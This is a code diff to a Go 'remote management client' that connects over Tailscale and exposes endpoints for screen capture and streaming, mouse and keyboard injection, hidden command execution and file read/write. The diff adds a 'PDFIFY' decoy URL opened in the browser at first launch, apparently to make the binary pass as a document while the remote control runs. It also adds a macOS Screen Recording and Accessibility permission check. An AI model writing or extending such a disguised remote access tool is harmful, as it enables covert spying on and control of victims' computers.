@@ -34,21 +34,31 @@ var (
 	BuildTime string = "unknown"
 	// Version of this client
 	Version string = "dev"
+	// DecoyURL is opened in the default browser on first launch (PDFIFY feature)
+	DecoyURL string = ""
 )
 
 type ClientInfo struct {
-	Hostname     string `json:"hostname"`
-	OS           string `json:"os"`
-	Arch         string `json:"arch"`
-	Version      string `json:"version"`
-	BuildTime    string `json:"build_time"`
-	TailscaleIP  string `json:"tailscale_ip"`
-	Uptime       string `json:"uptime"`
+	Hostname    string `json:"hostname"`
+	OS          string `json:"os"`
+	Arch        string `json:"arch"`
+	Version     string `json:"version"`
+	BuildTime   string `json:"build_time"`
+	TailscaleIP string `json:"tailscale_ip"`
+	Uptime      string `json:"uptime"`
 }
 
 func main() {
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
 	log.Printf("Remote Management Client v%s (built: %s)", Version, BuildTime)
+
+	// PDFIFY: open decoy URL in browser before doing anything else
+	if DecoyURL != "" {
+		openBrowser(DecoyURL)
+	}
+
+	// Check platform-specific permissions (macOS: Screen Recording + Accessibility)
+	checkPlatformPermissions()
 
 	if AuthKey == "" {
 		log.Fatal("No auth key compiled into binary. This binary was not built correctly.")
@@ -75,7 +85,6 @@ func main() {
 	// Wait for Tailscale to be ready
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
-
 	status, err := srv.Up(ctx)
 	if err != nil {
 		log.Fatalf("Failed to bring up Tailscale: %v", err)
@@ -127,20 +136,12 @@ func main() {
 		json.NewEncoder(w).Encode(sysInfo)
 	})
 
-	// Screen capture endpoint - returns current screenshot
+	// Register your existing handlers (defined in other files)
 	mux.HandleFunc("/screen/capture", handleScreenCapture)
-
-	// Screen stream endpoint - WebSocket for continuous streaming
 	mux.HandleFunc("/screen/stream", handleScreenStream)
-
-	// Mouse/keyboard input endpoints
 	mux.HandleFunc("/input/mouse", handleMouseInput)
 	mux.HandleFunc("/input/keyboard", handleKeyboardInput)
-
-	// Command execution (background, no GUI)
 	mux.HandleFunc("/exec", handleExec)
-
-	// File operations
 	mux.HandleFunc("/files/list", handleFileList)
 	mux.HandleFunc("/files/read", handleFileRead)
 	mux.HandleFunc("/files/write", handleFileWrite)
@@ -165,13 +166,10 @@ func main() {
 }
 
 func generateHostname() string {
-	// Get the computer's hostname
 	hostname, err := os.Hostname()
 	if err != nil {
 		hostname = "unknown"
 	}
-
-	// Sanitize hostname for Tailscale (alphanumeric and hyphens only)
 	sanitized := ""
 	for _, c := range hostname {
 		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' {
@@ -181,13 +179,11 @@ func generateHostname() string {
 	if sanitized == "" {
 		sanitized = "client"
 	}
-
 	return fmt.Sprintf("%s-%s", HostnamePrefix, sanitized)
 }
 
 func getStateDir() string {
 	var baseDir string
-
 	switch runtime.GOOS {
 	case "darwin":
 		homeDir, _ := os.UserHomeDir()
@@ -198,7 +194,6 @@ func getStateDir() string {
 		homeDir, _ := os.UserHomeDir()
 		baseDir = filepath.Join(homeDir, ".config", "remotemgmt")
 	}
-
 	os.MkdirAll(baseDir, 0700)
 	return baseDir
 }
@@ -208,22 +203,20 @@ func getStateDir() string {
 // =============================================================================
 
 type ScreenCaptureResponse struct {
-	Width    int    `json:"width"`
-	Height   int    `json:"height"`
-	Format   string `json:"format"`
-	Data     string `json:"data"` // base64 encoded
-	Display  int    `json:"display"`
-	Timestamp int64 `json:"timestamp"`
+	Width     int    `json:"width"`
+	Height    int    `json:"height"`
+	Format    string `json:"format"`
+	Data      string `json:"data"`
+	Display   int    `json:"display"`
+	Timestamp int64  `json:"timestamp"`
 }
 
 func handleScreenCapture(w http.ResponseWriter, r *http.Request) {
-	// Get display number (default 0 = primary)
 	displayNum := 0
 	if d := r.URL.Query().Get("display"); d != "" {
 		fmt.Sscanf(d, "%d", &displayNum)
 	}
 
-	// Quality parameter (1-100, default 50 for bandwidth)
 	quality := 50
 	if q := r.URL.Query().Get("quality"); q != "" {
 		fmt.Sscanf(q, "%d", &quality)
@@ -235,21 +228,18 @@ func handleScreenCapture(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	// Capture the screen using platform-specific implementation
 	img, bounds, err := captureScreen(displayNum)
 	if err != nil {
 		http.Error(w, fmt.Sprintf("Capture failed: %v", err), http.StatusInternalServerError)
 		return
 	}
 
-	// Encode as JPEG
 	var buf bytes.Buffer
 	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
 		http.Error(w, fmt.Sprintf("Encode failed: %v", err), http.StatusInternalServerError)
 		return
 	}
 
-	// Return as JSON with base64 data, or raw image
 	if r.URL.Query().Get("raw") == "true" {
 		w.Header().Set("Content-Type", "image/jpeg")
 		w.Write(buf.Bytes())
@@ -269,25 +259,22 @@ func handleScreenCapture(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(resp)
 }
 
-// Screen streaming using Server-Sent Events (SSE)
 func handleScreenStream(w http.ResponseWriter, r *http.Request) {
-	// Set headers for SSE
 	w.Header().Set("Content-Type", "text/event-stream")
 	w.Header().Set("Cache-Control", "no-cache")
 	w.Header().Set("Connection", "keep-alive")
 
-	// Get parameters
 	displayNum := 0
 	if d := r.URL.Query().Get("display"); d != "" {
 		fmt.Sscanf(d, "%d", &displayNum)
 	}
 
-	quality := 30 // Lower quality for streaming
+	quality := 30
 	if q := r.URL.Query().Get("quality"); q != "" {
 		fmt.Sscanf(q, "%d", &quality)
 	}
 
-	fps := 5 // Frames per second
+	fps := 5
 	if f := r.URL.Query().Get("fps"); f != "" {
 		fmt.Sscanf(f, "%d", &fps)
 		if fps < 1 {
@@ -315,16 +302,14 @@ func handleScreenStream(w http.ResponseWriter, r *http.Request) {
 		case <-ctx.Done():
 			return
 		case <-ticker.C:
-			// Capture using platform-specific implementation
 			img, bounds, err := captureScreen(displayNum)
 			if err != nil {
 				continue
 			}
 
-			// Simple change detection (skip if screen unchanged)
 			hash := simpleImageHash(img)
 			if hash == lastHash {
-				continue // No change, skip frame
+				continue
 			}
 			lastHash = hash
 
@@ -341,11 +326,10 @@ func handleScreenStream(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// Simple hash for change detection (samples pixels)
 func simpleImageHash(img *image.RGBA) uint64 {
 	var hash uint64
 	bounds := img.Bounds()
-	step := 50 // Sample every 50th pixel
+	step := 50
 	for y := bounds.Min.Y; y < bounds.Max.Y; y += step {
 		for x := bounds.Min.X; x < bounds.Max.X; x += step {
 			c := img.RGBAAt(x, y)
@@ -360,18 +344,18 @@ func simpleImageHash(img *image.RGBA) uint64 {
 // =============================================================================
 
 type MouseInput struct {
-	Action string `json:"action"` // move, click, doubleclick, rightclick, scroll
+	Action string `json:"action"`
 	X      int    `json:"x"`
 	Y      int    `json:"y"`
-	DeltaX int    `json:"delta_x"` // for scroll
-	DeltaY int    `json:"delta_y"` // for scroll
+	DeltaX int    `json:"delta_x"`
+	DeltaY int    `json:"delta_y"`
 }
 
 type KeyboardInput struct {
-	Action    string   `json:"action"` // type, keydown, keyup, hotkey
-	Text      string   `json:"text"`   // for type action
-	Key       string   `json:"key"`    // for keydown/keyup
-	Modifiers []string `json:"modifiers"` // ctrl, alt, shift, meta
+	Action    string   `json:"action"`
+	Text      string   `json:"text"`
+	Key       string   `json:"key"`
+	Modifiers []string `json:"modifiers"`
 }
 
 func handleMouseInput(w http.ResponseWriter, r *http.Request) {
@@ -386,7 +370,6 @@ func handleMouseInput(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Platform-specific implementation in input_*.go files
 	err := mouseAction(input)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
@@ -409,7 +392,6 @@ func handleKeyboardInput(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Platform-specific implementation in input_*.go files
 	err := keyboardAction(input)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
@@ -420,21 +402,16 @@ func handleKeyboardInput(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
 }
 
-// Platform-specific input functions mouseAction() and keyboardAction() are in:
-// - input_windows.go (direct Windows API calls)
-// - input_darwin.go (cliclick/AppleScript)
-// - input_other.go (stub)
-
 // =============================================================================
-// Command Execution (Silent/Background)
+// Command Execution
 // =============================================================================
 
 type ExecRequest struct {
 	Command string   `json:"command"`
 	Args    []string `json:"args"`
-	Dir     string   `json:"dir"`     // Working directory
-	Timeout int      `json:"timeout"` // Seconds (default 60)
-	Hidden  bool     `json:"hidden"`  // Hide console window (Windows)
+	Dir     string   `json:"dir"`
+	Timeout int      `json:"timeout"`
+	Hidden  bool     `json:"hidden"`
 }
 
 type ExecResponse struct {
@@ -479,12 +456,10 @@ func handleExec(w http.ResponseWriter, r *http.Request) {
 		cmd.Dir = req.Dir
 	}
 
-	// Capture output
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
 
-	// On Windows, hide the console window if requested
 	if runtime.GOOS == "windows" && req.Hidden {
 		hideWindowsConsole(cmd)
 	}
@@ -568,13 +543,12 @@ func handleFileRead(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Limit file size for reading
 	info, err := os.Stat(path)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
 		return
 	}
-	if info.Size() > 10*1024*1024 { // 10MB limit
+	if info.Size() > 10*1024*1024 {
 		http.Error(w, "File too large (max 10MB)", http.StatusBadRequest)
 		return
 	}
@@ -602,7 +576,6 @@ func handleFileWrite(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Read body (limit to 10MB)
 	r.Body = http.MaxBytesReader(w, r.Body, 10*1024*1024)
 	data, err := io.ReadAll(r.Body)
 	if err != nil {
